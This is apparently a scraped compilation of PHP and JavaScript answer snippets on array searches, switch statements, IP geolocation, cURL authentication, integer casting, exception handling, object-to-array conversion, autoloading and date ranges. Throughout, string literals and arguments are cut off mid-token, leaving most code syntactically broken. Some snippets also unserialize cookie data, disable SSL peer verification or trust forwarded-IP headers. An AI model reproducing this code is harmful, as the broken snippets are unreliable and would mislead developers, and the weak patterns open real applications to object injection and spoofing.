function array_search(needle, haystack) { for(var i in haystack) { if(haystack[i] == needle) return i; } return false; }
var a = [1,2,3,4,5,6,7,8,9]; var isSixInArray = a.filter(function(item){return item==6}).length ? true : false; var isSixInArray = a.indexOf(6)>=0;
function arrayIntersect(a, b) { var intersection = []; for(var i = 0; i < a.length; i++) { if(inArray(b, a[i])) intersection.push(a[i]); } return intersection; }
function in_array(needle, haystack, argStrict) { var key = if (strict) { for (key in haystack) { if (haystack[key] === needle) { return true; } } } else { for (key in haystack) { if (haystack[key] == needle) { return true; } } } return false; }
if (!Array.prototype.inArray) { Array.prototype.inArray = function(element) { return this.indexOf(element) > -1; }; } var array = ["one", "two", "three"]; array.inArray("one");
function in_array(what, where) { var a=false; for (var i=0; i<where.length; i++) { if(what == where[i]) { a=true; break; } } return a; }
var success = $.grep(array_a, function(v,i) { return $.inArray(v, array_b) !== -1; }).length === array_a.length;
inArray: function(needle, haystack) { var result = false; for (var i in haystack) { if (haystack[i] === needle) { result = true; break; } } return result; }
function in_array(needle, haystack){ return haystack.indexOf(needle) !== -1; }
switch ($value) { case 1: case 2: echo "the value is either 1 or 2."; break; }
$v = 1; switch (true) { case ($v == 1 || $v == 2): echo break; }
switch($v) { case 1: case 2: echo "the value is either 1 or 2"; break; }
$r1 = range(1, 100); $r2 = range(100, 200); $v = 76; switch (true) { case in_array($v, $r1) : echo break; case in_array($v, $r2) : echo break; }
switch (true) { case ($value > 3) : break; case ($value >= 4 && $value <= 6) : break; }
switch($bar) { case 4: echo "This is not the number you $foo = 92; }
case 4: echo "This is not the number you $foo = 92; break; case 5: echo "A copy of Ringworld is on its way to you!\n"; $foo = 34; break;
case 3: case 4: echo "This is not the number you $foo = 92; break; case 5: echo "A copy of Ringworld is on its way to you!\n"; $foo = 34; break;
switch(true) { case (strlen($foo) > 30): $error = "The value provided is too long."; $valid = false; break; case (!preg_match( $error = "The value must be alphanumeric."; $valid = false; break; default: $valid = true; break; }
switch($value) { case 1: case 2: echo "the value is either 1 or 2"; break; }
switch ($your_variable) { case 1: case 2: echo "the value is either 1 or 2."; break; }
switch($a) { case 1: case 2: ....... ....... ....... break; }
$today = date("D"); switch($today){ case "Mon": case "Tue": echo "Today is Tuesday or Monday. Buy some food."; break; case "Wed": echo "Today is Wednesday. Visit a doctor."; break; case "Thu": echo "Today is Thursday. Repair your car."; break; default: echo "No information available for that day."; break; }
<?php $go = $_REQUEST[ ?> <?php if ($go == <div> echo "hello"; }?>
<?php if (isset($_SERVER[ { $real_ip_adress = $_SERVER[ } if (isset($_SERVER[ { $real_ip_adress = $_SERVER[ } else { $real_ip_adress = $_SERVER[ } $cip = $real_ip_adress; $iptolocation = $creatorlocation = file_get_contents($iptolocation); ?>
<?php function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) { $output = NULL; if (filter_var($ip, FILTER_VALIDATE_IP) === FALSE) { $ip = $_SERVER["REMOTE_ADDR"]; if ($deep_detect) { if (filter_var(@$_SERVER[ $ip = $_SERVER[ if (filter_var(@$_SERVER[ $ip = $_SERVER[ } } $purpose = str_replace(array("name", "\n", "\t", " ", "-", "_"), NULL, strtolower(trim($purpose))); $support = array("country", "countrycode", "state", "region", "city", "location", "address"); $continents = array( "AF" => "Africa", "AN" => "Antarctica", "AS" => "Asia", "EU" => "Europe", "OC" => "Australia (Oceania)", "NA" => "North America", "SA" => "South America" ); if (filter_var($ip, FILTER_VALIDATE_IP) && in_array($purpose, $support)) { $ipdat = @json_decode(file_get_contents("http: if (@strlen(trim($ipdat->geoplugin_countryCode)) == 2) { switch ($purpose) { case "location": $output = array( "city" => @$ipdat->geoplugin_city, "state" => @$ipdat->geoplugin_regionName, "country" => @$ipdat->geoplugin_countryName, "country_code" => @$ipdat->geoplugin_countryCode, "continent" => @$continents[strtoupper($ipdat->geoplugin_continentCode)], "continent_code" => @$ipdat->geoplugin_continentCode ); break; case "address": $address = array($ipdat->geoplugin_countryName); if (@strlen($ipdat->geoplugin_regionName) >= 1) $address[] = $ipdat->geoplugin_regionName; if (@strlen($ipdat->geoplugin_city) >= 1) $address[] = $ipdat->geoplugin_city; $output = implode(", ", array_reverse($address)); break; case "city": $output = @$ipdat->geoplugin_city; break; case "state": $output = @$ipdat->geoplugin_regionName; break; case "region": $output = @$ipdat->geoplugin_regionName; break; case "country": $output = @$ipdat->geoplugin_countryName; break; case "countrycode": $output = @$ipdat->geoplugin_countryCode; break; } } } return $output; } ?>
<?php echo ip_info("Visitor", "Country"); echo ip_info("Visitor", "Country Code"); echo ip_info("Visitor", "State"); echo ip_info("Visitor", "City"); echo ip_info("Visitor", "Address"); print_r(ip_info("Visitor", "Location")); ?>
<?php echo ip_info("173.252.110.27", "Country"); echo ip_info("173.252.110.27", "Country Code"); echo ip_info("173.252.110.27", "State"); echo ip_info("173.252.110.27", "City"); echo ip_info("173.252.110.27", "Address"); print_r(ip_info("173.252.110.27", "Location")); ?>
$xml = simplexml_load_file("http: echo $xml->geoplugin_countryName ; echo "<pre>"; foreach ($xml as $key => $value) { echo $key , "= " , $value , " \n" ; } echo "</pre>";
function getRealIpAddr() { if (!empty($_SERVER[ { $ip=$_SERVER[ } elseif (!empty($_SERVER[ { $ip=$_SERVER[ } else { $ip=$_SERVER[ } return $ip; }
United States geoplugin_city= San Antonio geoplugin_region= TX geoplugin_areaCode= 210 geoplugin_dmaCode= 641 geoplugin_countryCode= US geoplugin_countryName= United States geoplugin_continentCode= NA geoplugin_latitude= 29.488899230957 geoplugin_longitude= -98.398696899414 geoplugin_regionCode= TX geoplugin_regionName= Texas geoplugin_currencyCode= USD geoplugin_currencySymbol= $ geoplugin_currencyConverter= 1
function ip_visitor_country() { $client = @$_SERVER[ $forward = @$_SERVER[ $remote = $_SERVER[ $country = "Unknown"; if(filter_var($client, FILTER_VALIDATE_IP)) { $ip = $client; } elseif(filter_var($forward, FILTER_VALIDATE_IP)) { $ip = $forward; } else { $ip = $remote; } $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, "http: curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE); $ip_data_in = curl_exec($ch); curl_close($ch); $ip_data = json_decode($ip_data_in,true); $ip_data = str_replace( if($ip_data && $ip_data[ $country = $ip_data[ } return } echo ip_visitor_country(); ?>
$gi = geoip_open( $country = geoip_country_code_by_addr($gi, $_SERVER[ geoip_close($gi);
$json = file_get_contents( $expression = json_decode($json); print_r($expression);
<?php $ip = $_SERVER[ if(!empty($ip)){ require( /** * Newest data (SQL) avaliable on project website * @link http: */ $dbConfigArray = array( ); $phpIp2Country = new phpIp2Country($ip,$dbConfigArray); $country = $phpIp2Country->getInfo(IP_COUNTRY_NAME); echo $country; ?>
<? require( $dbConfigArray = array( ); $phpIp2Country = new phpIp2Country( print_r($phpIp2Country->getInfo(IP_INFO)); ?>
Array ( [IP_FROM] => 3585376256 [IP_TO] => 3585384447 [REGISTRY] => RIPE [ASSIGNED] => 948758400 [CTRY] => PL [CNTRY] => POL [COUNTRY] => POLAND [IP_STR] => 213.180.138.148 [IP_VALUE] => 3585378964 [IP_FROM_STR] => 127.255.255.255 [IP_TO_STR] => 127.255.255.255 )
$user_ip = getIP(); $meta_tags = get_meta_tags( echo print_r($meta_tags);
Array( [known] => true [locationcode] => USCALANG [fips104] => US [iso2] => US [iso3] => USA [ison] => 840 [internet] => US [countryid] => 254 [country] => United States [regionid] => 126 [region] => California [regioncode] => CA [adm1code] => [cityid] => 7275 [city] => Los Angeles [latitude] => 34.0452 [longitude] => -118.2840 [timezone] => -08:00 [certainty] => 53 [mapbytesremaining] => Free )
function getIP(){ if (isset($_SERVER["HTTP_X_FORWARDED_FOR"])){ $pattern = "/^(([1-9]?[0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5]).){3}([1-9]?[0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$/"; if(preg_match($pattern, $_SERVER["HTTP_X_FORWARDED_FOR"])){ $userIP = $_SERVER["HTTP_X_FORWARDED_FOR"]; }else{ $userIP = $_SERVER["REMOTE_ADDR"]; } } else{ $userIP = $_SERVER["REMOTE_ADDR"]; } return $userIP; }
<?php $ip = $_REQUEST[ $query = @unserialize(file_get_contents( if($query && $query[ echo } else { echo } ?>
$ipaddress = $_SERVER[ $api_key = $data = file_get_contents("http: $data = json_decode($data); $country = $data[
$ipaddress = $_SERVER[ function geoCheckIP($ip) { $response=@file_get_contents( $patterns=array(); $patterns["country"] = $ipInfo=array(); foreach ($patterns as $key => $pattern) { $ipInfo[$key] = preg_match($pattern,$response,$value) && !empty($value[1]) ? $value[1] : } return $ipInfo; } print_r(geoCheckIP($ipaddress));
$ip = $details = json_decode(file_get_contents("https: echo $details->country_name; echo $details->city; $details = json_decode(file_get_contents("https: echo $details->country_name;
if (!empty($_SERVER[ $ip = $_SERVER[ } else if (!empty($_SERVER[ $ip = $_SERVER[ } else if (!empty($_SERVER[ $ip = $_SERVER[ } else { $ip = false; } $ip_info = unserialize(file_get_contents(
$ipLite = new ip2location_lite; $ipLite->setKey( if(!$_COOKIE["visitorCity"]){ $visitorCity = $ipLite->getCity($_SERVER[ if ($visitorCity[ $data = base64_encode(serialize($visitorCity)); setcookie("visitorCity", $data, time()+3600*24*7); } } $visitorCity = unserialize(base64_decode($_COOKIE["visitorCity"])); echo $visitorCity[
<?php function ip_details($ip) { $json = file_get_contents("http: $details = json_decode($json); return $details; } $details = ip_details(YoUR IP ADDRESS); echo $details->city; echo "<br>".$details->country; echo "<br>".$details->org; echo "<br>".$details->hostname; / ?>
$ip = "202.142.178.220"; $ipdat = @json_decode(file_get_contents("http: if(property_exists($ipdat, echo $ipdat->geoplugin_countryCode; } if(property_exists($ipdat, echo $ipdat->geoplugin_countryName; }
<?php $ip = $_SERVER[ $api_key = "YOUR_API_KEY"; $freegeoipjson = file_get_contents("http: $jsondata = json_decode($freegeoipjson); $countryfromip = $jsondata->country_name; echo "Country: ". $countryfromip .""; ?>
$timestamp = 1465298940; $datetimeFormat = $date = new \DateTime(); $date->setTimestamp($timestamp); echo $date->format($datetimeFormat);
$time = time() $year = $time/31556926 % 12; $week = $time / 604800 % 52; $hour = $time / 3600 % 24; $minute = $time / 60 % 60; $second = $time % 60;
<?php $timestamp=1333342365; echo gmdate("Y-m-d\TH:i:s\Z", $timestamp); ?>
$timestamp = 1299446702; $date = DateTime::createFromFormat(
$mytimestamp = 1465298940; echo gmdate("m-d-Y", $mytimestamp);
function format_date($str) { $month = array(" ", "Jan", "Feb", "Mar", "Apr", "May", "June", "July", "Aug", "Sep", "Oct", "Nov", "Dec"); $y = explode( $x = explode( $date = ""; $m = (int)$x[1]; $m = $month[$m]; $st = array(1, 21, 31); $nd = array(2, 22); $rd = array(3, 23); if(in_array( $x[2], $st)) { $date = $x[2]. } else if(in_array( $x[2], $nd)) { $date .= $x[2]. } else if(in_array( $x[2], $rd)) { $date .= $x[2]. } else { $date .= $x[2]. } $date .= return $date; }
curl_setopt($process, CURLOPT_USERPWD, $username . ":" . $password);
$process = curl_init($host); curl_setopt($process, CURLOPT_HTTPHEADER, array( curl_setopt($process, CURLOPT_HEADER, 1); curl_setopt($process, CURLOPT_USERPWD, $username . ":" . $password); curl_setopt($process, CURLOPT_TIMEOUT, 30); curl_setopt($process, CURLOPT_POST, 1); curl_setopt($process, CURLOPT_POSTFIELDS, $payloadName); curl_setopt($process, CURLOPT_RETURNTRANSFER, TRUE); $return = curl_exec($process); curl_close($process);
$headers = array( ); curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
<?php $login = $password = $url = $ch = curl_init(); curl_setopt($ch, CURLOPT_URL,$url); curl_setopt($ch, CURLOPT_RETURNTRANSFER,1); curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC); curl_setopt($ch, CURLOPT_USERPWD, "$login:$password"); $result = curl_exec($ch); curl_close($ch); echo($result);
$client = new GuzzleHttp\Client([ $response = $client->get(
<?php $data = array("username" => "test"); $data_string = json_encode($data); $api_key = "your_api_key"; $password = "xxxxxx"; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, "https: curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 20); curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST"); curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_USERPWD, $api_key. curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC); curl_setopt($ch, CURLOPT_HTTPHEADER, array( ); if(curl_exec($ch) === false) { echo } $errors = curl_error($ch); $result = curl_exec($ch); $returnCode = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE); curl_close($ch); echo $returnCode; var_dump($errors); print_r(json_decode($result, true));
$url = $client_id = ""; $client_pass= ""; $opts = array( array( ) ); $context = stream_context_create($opts); $json = file_get_contents($url, false, $context); $result = json_decode($json, true); if(json_last_error() != JSON_ERROR_NONE){ return null; } print_r($result);
POST /page.php HTTP/1.1 key1=value1&key2=value2&key3=value3
POST /page.php HTTP/1.1 {"key1":"value1","key2":"value2","key3":"value3"}
/** * Returns the JSON encoded POST data, if any, as an object. * * @return Object|null */ private function retrieveJsonPostData() { $rawData = file_get_contents("php: return json_decode($rawData); }
<?php if(!isset($_POST) || empty($_POST)) { ?> <form name="form1" method="post" action=""> <input type="text" name="textfield"><br /> <input type="submit" name="Submit" value="submit"> </form> <?php } else { $example = file_get_contents("php: echo $example; } ?>
<div id="foo"> ass will fail but password will not </div> <script> $( customSwears: [ }); </script>
$errors = array(); $SCREENNAME = mysql_real_escape_string($_POST[ $ProfanityCheckString = strtoupper($SCREENNAME); $ProfanityCheckString = preg_replace( $ProfanityCheckString = preg_replace( $ProfanityCheckString = preg_replace( $ProfanityCheckString = preg_replace( $ProfanityCheckString = preg_replace( $ProfanityCheckString = preg_replace( $ProfanityCheckString = preg_replace( $ProfanityCheckString = preg_replace( $ProfanityCheckString = preg_replace( $ProfanityCheckString = preg_replace( $CheckProfanity = mysql_query("SELECT * FROM DATABASE.TABLE p WHERE p.WORD = if(mysql_num_rows($CheckProfanity) > 0) {$errors[] = if (count($errors) > 0) {foreach($errors as $error) {$errorString .= "<span class=
$product_id = intval($_GET[ $product_id = (int) $_GET[
$test_int = 12; $test_string = "12"; $test_float = 12.8; echo (int) $test_int; echo (int) $test_string; echo (int) $test_float; echo intval($test_int, 8); echo intval($test_string, 8); echo intval($test_float, 8)
var_dump((int)"0123", intval("0123"), intval("0123", 8));
$ php -v PHP 7.0.4-5+deb.sury.org~trusty+1 (cli) ( NTS )
php > $start_ts = microtime(true); for($i = 0; $i < 100000000; $i++) { $a = (int) string(18) "3279.1121006012 ms" php > $start_ts = microtime(true); for($i = 0; $i < 100000000; $i++) { $a = intval( string(18) "5379.3351650238 ms"
$ php -v PHP 7.1.0RC6 (cli) (built: Nov 9 2016 04:45:59) ( NTS ) $ php -a php > $start_ts = microtime(true); for($i = 0; $i < 100000000; $i++) { $a = (int) string(18) "3583.9052200317 ms" php > $start_ts = microtime(true); for($i = 0; $i < 100000000; $i++) { $a = intval( string(18) "3569.0960884094 ms" php > $start_ts = microtime(true); for($i = 0; $i < 100000000; $i++) { $a = string(18) "1641.7920589447 ms"
$ids = implode(",", array_map( $sql = "SELECT * FROM table WHERE ids IN ($ids)";
array(3) { [0]=> string(1) "1" [1]=> string(1) "2" [2]=> string(1) "3" }
$integers = array(); for ($i = 0; $i < 1000000; $i++) { $integers[] = rand(0, 100); } $long_string = implode(
$result_array = array(); $strings_array = explode( foreach ($strings_array as $each_number) { $result_array[] = (int) $each_number; }
Method 1 Method 2 Method 3 0.4804770947 0.3608930111 0.3387751579 0.4748001099 0.363986969 0.3762528896 0.4625790119 0.3645150661 0.3335959911 0.5065748692 0.3570590019 0.3365750313 0.4803431034 0.4135499001 0.3330330849 0.4510772228 0.4421861172 0.341176033 0.503674984 0.3612480164 0.3561749458 0.5598649979 0.352314949 0.3766179085 0.4573421478 0.3527538776 0.3473439217 0.4863037268 0.3742785454 0.3488383293
$stringArray = [ $intArray = array_map( function($value) { return (int)$value; }, $stringArray ); var_dump($intArray);
array(4) { [0]=> int(1) [1]=> int(2) [2]=> int(3) [3]=> int(4) }
$string = "1,2,3, bla"; $ids = array_flip(array_flip(explode( var_dump($ids);
$intArray = array (); $strArray = explode( foreach ($strArray as $value) $intArray [] = intval ($value);
public function arrayValuesToInt(&$array){ if(is_array($array)){ foreach($array as &$arrayPiece){ arrayValuesToInt($arrayPiece); } }else{ $array = intval($array); } }
$ch = curl_init(); $headers["Content-Length"] = strlen($postString); $headers["User-Agent"] = "Curl/1.0"; curl_setopt($ch, CURLOPT_URL, $requestUrl); curl_setopt($ch, CURLOPT_HEADER, false); curl_setopt($ch, CURLOPT_HTTPHEADER, $headers); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_USERPWD, curl_setopt($ch,CURLOPT_TIMEOUT,1000); $response = curl_exec($ch); curl_close($ch);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0); curl_setopt($ch, CURLOPT_TIMEOUT, 400);
if (!isset($_GET[ $ch = curl_init( curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_NOSIGNAL, 1); curl_setopt($ch, CURLOPT_TIMEOUT_MS, 200); $data = curl_exec($ch); $curl_errno = curl_errno($ch); $curl_error = curl_error($ch); curl_close($ch); if ($curl_errno > 0) { echo "cURL Error ($curl_errno): $curl_error\n"; } else { echo "Data received: $data\n"; } } else { sleep(10); echo "Done."; }
try { } catch( AError, BError $e ) { handler1( $e ) } catch( Exception $e ) { handler2( $e ) }
try { } catch( Exception $e ) { if ($e instanceof AError OR $e instanceof BError) { } else { throw $e; } }
try { } catch( AError $e ) { handler1( $e ); } catch ( BError $b ) { handler2( $e ); }
try { } catch(AError | BError $e) { } catch(Exception $e) { }
abstract class MyExceptions extends Exception {} abstract class LetterError extends MyExceptions {} class AError extends LetterError {} class BError extends LetterError {}
interface Group1 {} class AError extends LetterError implements Group1 {} class BError extends LetterError implements Group1 {}
function handleExceptionMethod1(Exception $e) { } function handleExceptionMethod2(Exception $e) { }
try { stuff() } catch(ExceptionA $e) { $this->handleExceptionMethod1($e); } catch(ExceptionB $e) { $this->handleExceptionMethod1($e); } catch(ExceptionC $e) { $this->handleExceptionMethod1($e); } catch(Exception $e) { $this->handleExceptionMethod2($e); }
<?php try { } catch (FirstException $ex) { $this->manageException($ex); } catch (SecondException $ex) { $this->manageException($ex); } ?>
<?php try { } catch (FirstException | SecondException $ex) { $this->manageException($ex); } ?>
catch( AError | BError $e ) { handler1( $e ) } catch (CError $e){ handler2($e); } catch(Exception $e){ handler3($e); }
catch(Exception $ex){ if($ex instanceof AError){ } elseif($ex instanceof BError){ } else { throw $ex; } }
class FooException extends Exception { public function __construct($message = null, $code = 0) { } } class BarException extends Exception { public function __construct($message = null, $code = 0) { } } class BazException extends Exception { public function __construct($message = null, $code = 0) { } }
try { } catch(FooException $e) { } catch(BarException $e) { } catch(BazException $e) { } catch(Exception $e) { }
try { } catch (Exception $e) { switch (get_class($e)) { case case break; case break; case default: throw $e; } }
$ABError = null; try { } catch (AError $ABError) { } catch (BError $ABError) { } catch (Exception $e) { handler2($e); } if ($ABError) { handler1($ABError); }
<?php class A_Error extends Exception {} class B_Error extends Exception {} class C_Error extends Exception {} try { throw new A_Error(); } catch (A_Error $e) { goto abc; } catch (B_Error $e) { goto abc; } catch (C_Error $e) { abc: var_dump(get_class($e)); echo "Gotta Catch }
class ErrorHandler{ public static function excep_handler($e) { print_r($e); } } set_exception_handler(array(
try { if (1 === $foo) { throw new Exception(sprintf( } if (2 === $bar) { throw new Exception(sprintf( } } catch (Exception $e) { switch ($e->getCode()) { case 1: break; case 2: break; default: } }
<?php $ex = NULL try { } catch (FirstException $ex) { } catch (SecondException $ex) { } if ($ex !== NULL) { } ?>
Array ( [0] => Object ( [_fields:private] => Array ( [id]=>9093 [name]=>zahir ) Object ( [_fields:private] => Array ( [id]=>9094 [name]=>hussain ).. ) )
Array ( [0]=> ( [id]=>9093 [name]=>zahir ) [1]=> ( [id]=>9094 [name]=>hussain )... )
<?php print_r(get_object_vars($response->response->docs)); ?>
function objectToArray ($object) { if(!is_object($object) && !is_array($object)) return $object; return array_map( }
$array = json_decode(json_encode($response->response->docs), true);
function toArray($obj) { if (is_object($obj)) $obj = (array)$obj; if (is_array($obj)) { $new = array(); foreach ($obj as $key => $val) { $new[$key] = toArray($val); } } else { $new = $obj; } return $new; }
$arrayObject = new ArrayObject($object); $array = $arrayObject->getArrayCopy();
class RecursiveArrayObject extends ArrayObject { function getArrayCopy() { $resultArray = parent::getArrayCopy(); foreach($resultArray as $key => $val) { if (!is_object($val)) { continue; } $o = new RecursiveArrayObject($val); $resultArray[$key] = $o->getArrayCopy(); } return $resultArray; } } $arrayObject = new RecursiveArrayObject($object); $array = $arrayObject->getArrayCopy();
<?php print_r(json_decode(json_encode($response->response->docs),true)); ?>
public function objectToArray($object) { if (!is_object($object) && !is_array($object)) return $object; return array_map(array("HelperFunctions", "objectToArray"), (array) $object); }
$input = [ (object) [6,7,8, [9, 10, 11, (object) [12, 13, 14]]] ], ]; echo "<pre>"; var_dump($input); var_dump(toAnArray($input)); public function toAnArray(&$input) { if (is_object($input)) { $input = get_object_vars($input); } foreach ($input as &$item) { if (is_object($item) || is_array($item)) { if (is_object($item)) { $item = get_object_vars($item); } self::toAnArray($item); } } }
namespace MyProject; function output() { echo } namespace RSSLibrary; function output(){ echo }
namespace MyProject; output(); \RSSLibrary\output();
Filesystem | PHP Namespace ----------------|------------------ /Dir/File.txt | \Namespace\Class
| Filesystem | PHP Namespace --------------------------|-----------------------|------------------------- Cas sensitive | No | Yes --------------------------|-----------------------|------------------------- Name with plain number | Yes | No --------------------------|-----------------------|------------------------- Path level | Yes | Yes --------------------------|-----------------------|------------------------- Plain metacharacters name | Yes | No
App\Controller\IndexController --> dir/App/Controller/IndexController.php
App\Controller\IndexController --> dir/IndexController.php
. +-- src | +-- Book | +-- History | | +-- UnitedStates.php - namespace Book\History; +-- Vehicle | +-- Air | | +-- Wings | | | +-- Airplane.php - namespace Vehicle\Air\Wings; | +-- Road | | +-- Car.php - namespace Vehicle\Road; +-- tests +-- test.php +-- vendor
"autoload": { "psr-0": { "Book\\": "src/", "Vehicle\\": "src/" } }
"autoload": { "psr-4": { "Book\\": "src/", "Vehicle\\": "src/" } }
"autoload": { "psr-4": { "Book\\": "src/Book/", "Vehicle\\": "src/Vehicle/" } }
$period = new DatePeriod( new DateTime( new DateInterval( new DateTime( );
function createDateRangeArray($strDateFrom,$strDateTo) { $aryRange=array(); $iDateFrom=mktime(1,0,0,substr($strDateFrom,5,2), substr($strDateFrom,8,2),substr($strDateFrom,0,4)); $iDateTo=mktime(1,0,0,substr($strDateTo,5,2), substr($strDateTo,8,2),substr($strDateTo,0,4)); if ($iDateTo>=$iDateFrom) { array_push($aryRange,date( while ($iDateFrom<$iDateTo) { $iDateFrom+=86400; array_push($aryRange,date( } } return $aryRange; }
/** * Creating date collection between two dates * * <code> * <?php * * date_range("2014-01-01", "2014-01-20", "+1 day", "m/d/Y"); * * * date_range("01:00:00", "23:00:00", "+1 hour", "H:i:s"); * </code> * * @author Ali OYGUR <alioygur@gmail.com> * @param string since any date, time or datetime format * @param string until any date, time or datetime format * @param string step * @param string date of output format * @return array */ function date_range($first, $last, $step = $dates = array(); $current = strtotime($first); $last = strtotime($last); while( $current <= $last ) { $dates[] = date($output_format, $current); $current = strtotime($step, $current); } return $dates; }
/** * Generate an array of string dates between 2 dates * * @param string $start Start date * @param string $end End date * @param string $format Output format (Default: Y-m-d) * * @return array */ function getDatesFromRange($start, $end, $format = $array = array(); $interval = new DateInterval( $realEnd = new DateTime($end); $realEnd->add($interval); $period = new DatePeriod(new DateTime($start), $interval, $realEnd); foreach($period as $date) { $array[] = $date->format($format); } return $array; }
$period = new DatePeriod(new DateTime( foreach ($period as $date) { $dates[] = $date->format("Y-m-d"); } echo var_dump($dates); echo exit();
function GetDays($sStartDate, $sEndDate){ $sStartDate = gmdate("Y-m-d", strtotime($sStartDate)); $sEndDate = gmdate("Y-m-d", strtotime($sEndDate)); $aDays[] = $sStartDate; $sCurrentDate = $sStartDate; while($sCurrentDate < $sEndDate){ $sCurrentDate = gmdate("Y-m-d", strtotime("+1 day", strtotime($sCurrentDate))); $aDays[] = $sCurrentDate; } return $aDays; }
function getDatesFromRange($start, $end){ $dates = array($start); while(end($dates) < $end){ $dates[] = date( } return $dates; }
$period = new DatePeriod( new DateTime( new DateInterval( new DateTime( );
/** * creating between two date * @param string since * @param string until * @param string step * @param string date format * @return array * @author Ali OYGUR <alioygur@gmail.com> */ function dateRange($first, $last, $step = $dates = array(); $current = strtotime($first); $last = strtotime($last); while( $current <= $last ) { $dates[] = date($format, $current); $current = strtotime($step, $current); } return $dates; }
function getDatesFromRange($start, $end, $format= return array_map(function($timestamp) use($format) { return date($format, $timestamp); }, range(strtotime($start) + ($start < $end ? 4000 : 8000), strtotime($end) + ($start < $end ? 8000 : 4000), 86400)); }
date_default_timezone_set( print_r(getDatesFromRange( print_r(getDatesFromRange( print_r(getDatesFromRange( print_r(getDatesFromRange( print_r(getDatesFromRange( print_r(getDatesFromRange( print_r(getDatesFromRange( print_r(getDatesFromRange(
Array ( [0] => 2016-07-28 [1] => 2016-07-29 [2] => 2016-07-30 [3] => 2016-07-31 [4] => 2016-08-01 [5] => 2016-08-02 ) Array ( [0] => 2016-08-02 [1] => 2016-08-01 [2] => 2016-07-31 [3] => 2016-07-30 [4] => 2016-07-29 [5] => 2016-07-28 ) Array ( [0] => 2016-10-28 [1] => 2016-10-29 [2] => 2016-10-30 [3] => 2016-10-31 [4] => 2016-11-01 [5] => 2016-11-02 ) Array ( [0] => 2016-11-02 [1] => 2016-11-01 [2] => 2016-10-31 [3] => 2016-10-30 [4] => 2016-10-29 [5] => 2016-10-28 ) Array ( [0] => 2016-04-02 [1] => 2016-04-01 [2] => 2016-03-31 [3] => 2016-03-30 [4] => 2016-03-29 [5] => 2016-03-28 [6] => 2016-03-27 [7] => 2016-03-26 [8] => 2016-03-25 ) Array ( [0] => 2016-03-25 [1] => 2016-03-26 [2] => 2016-03-27 [3] => 2016-03-28 [4] => 2016-03-29 [5] => 2016-03-30 [6] => 2016-03-31 [7] => 2016-04-01 [8] => 2016-04-02 ) Array ( [0] => 2016-08-02 [1] => 2016-08-01 [2] => 2016-07-31 [3] => 2016-07-30 [4] => 2016-07-29 [5] => 2016-07-28 [6] => 2016-07-27 [7] => 2016-07-26 [8] => 2016-07-25 ) Array ( [0] => 2016-07-25 [1] => 2016-07-26 [2] => 2016-07-27 [3] => 2016-07-28 [4] => 2016-07-29 [5] => 2016-07-30 [6] => 2016-07-31 [7] => 2016-08-01 [8] => 2016-08-02 )
function createRange($start, $end, $format = $start = new DateTime($start); $end = new DateTime($end); $invert = $start > $end; $dates = array(); $dates[] = $start->format($format); while ($start != $end) { $start->modify(($invert ? $dates[] = $start->format($format); } return $dates; }
print_r(createRange( /*Array ( [0] => 2010-10-01 [1] => 2010-10-02 [2] => 2010-10-03 [3] => 2010-10-04 [4] => 2010-10-05 )*/ print_r(createRange( /*Array ( [0] => 5 Oct 2010 [1] => 4 Oct 2010 [2] => 3 Oct 2010 [3] => 2 Oct 2010 [4] => 1 Oct 2010 )*/
function createRange($startDate, $endDate) { $tmpDate = new DateTime($startDate); $tmpEndDate = new DateTime($endDate); $outArray = array(); do { $outArray[] = $tmpDate->format( } while ($tmpDate->modify( return $outArray; }
$date_from = "2018-02-03"; $date_from = strtotime($date_from); $date_to = "2018-09-10"; $date_to = strtotime($date_to); for ($i=$date_from; $i<=$date_to; $i+=86400) { echo date("Y-m-d", $i). }
$begin = new DateTime( $end = new DateTime( $end = $end->modify( $interval = new DateInterval( $daterange = new DatePeriod($begin, $interval ,$end); foreach($daterange as $date){ echo $date->format("Ymd") . "<br>"; }
function createDateRangeArray($start, $end) { $range = array(); if (is_string($start) === true) $start = strtotime($start); if (is_string($end) === true ) $end = strtotime($end); if ($start > $end) return createDateRangeArray($end, $start); do { $range[] = date( $start = strtotime("+ 1 day", $start); } while($start < $end); return $range; }
<? print_r(getDatesFromRange( function getDatesFromRange($startDate, $endDate) { $return = array($startDate); $start = $startDate; $i=1; if (strtotime($startDate) < strtotime($endDate)) { while (strtotime($start) < strtotime($endDate)) { $start = date( $return[] = $start; $i++; } } return $return; }
public function buildDateRangeArray($first, $last) { while ($first <= $last) { $dates[] = $first->toDateString(); $first->addDay(); } return $dates; }
function returnBetweenDates( $startDate, $endDate ){ $startStamp = strtotime( $startDate ); $endStamp = strtotime( $endDate ); if( $endStamp > $startStamp ){ while( $endStamp >= $startStamp ){ $dateArr[] = date( $startStamp = strtotime( } return $dateArr; }else{ return $startDate; } } returnBetweenDates(
Array ( [0] => 2014-09-16 [1] => 2014-09-17 [2] => 2014-09-18 [3] => 2014-09-19 [4] => 2014-09-20 [5] => 2014-09-21 [6] => 2014-09-22 [7] => 2014-09-23 [8] => 2014-09-24 [9] => 2014-09-25 [10] => 2014-09-26 )
